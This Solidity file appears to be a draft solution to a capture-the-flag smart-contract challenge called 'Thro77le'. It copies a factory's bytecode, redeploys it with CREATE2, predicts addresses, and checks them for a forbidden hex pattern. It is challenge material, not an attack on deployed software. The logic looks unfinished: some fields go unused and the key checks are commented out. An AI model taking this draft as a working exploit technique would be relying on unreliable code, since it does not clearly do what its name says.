// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_Thro77le {
    function factory() external view returns (address);

    function createContract(bytes memory bytecode, uint256 salt) external;
}

interface Thro77le_Factory {}

contract Thro77le_Foo {}

contract Exploit_Thro77le {
    IChallenge_Thro77le instance;
    Thro77le_Factory factory;

    constructor(IChallenge_Thro77le _instance) payable {
        instance = _instance;
        factory = Thro77le_Factory(address(0xFD4f30C20dA65a37fd74d55B257442a08469e6A6));
    }

    function finalize() external {
        bytes memory bytecode = address(factory).code;
        Factory f = new Factory();

        address addr;
        uint256 salt = 0;

        console.log(computeAddress(bytecode, address(factory), salt));
        console.log(salt);

        f.createContract(bytecode, salt);

        selfdestruct(payable(msg.sender));
    }

    function computeAddress(
        bytes memory bytecode,
        address factory,
        uint256 _salt
    ) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), factory, _salt, keccak256(bytecode)));

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }

    function isForbidden(address _addr) internal view returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"00000000000000000000000000000000000f0b1d";
        bytes20 mask = hex"00000000000000000000000000000000000fffff";

        for (uint256 i; i != 30; ++i) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}

contract Factory {
    function createContract(bytes memory bytecode, uint256 salt) public returns (bool) {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        console.log(addr);
        // require(isForbidden(addr), "Only Forbidden Contracts");
        // require(isFunded(addr), "Only Funded Contracts");
        return true;
    }

    function isForbidden(address _addr) internal view returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"00000000000000000000000000000000000f0b1d";
        bytes20 mask = hex"00000000000000000000000000000000000fffff";

        for (uint256 i; i != 30; ++i) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }

    function isFunded(address _addr) internal view returns (bool) {
        return _addr.balance >= 0.1 ether;
    }
}
